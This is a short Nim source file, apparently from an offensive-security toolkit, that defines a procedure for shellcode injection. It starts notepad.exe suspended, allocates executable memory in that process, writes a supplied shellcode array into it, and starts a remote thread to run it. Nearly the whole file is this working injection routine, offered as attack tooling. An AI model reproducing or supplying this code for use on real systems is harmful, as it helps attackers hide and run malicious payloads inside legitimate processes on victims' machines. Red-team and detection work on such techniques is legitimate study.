#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import osproc


proc InjectCreateRemoteThread*[I, T](shellcode: array[I, T]): void = 
    # CreateRemoteThread method
    # Source: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim

    let tProcess = startProcess("notepad.exe")
    tProcess.suspend()
    defer: tProcess.close()

    echo "[CRT] Target process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[CRT] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[CRT] WriteProcessMemory: ", bool(wSuccess)

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[CRT] tHandle: ", tHandle
    echo "[CRT] Shellcode injected!"  
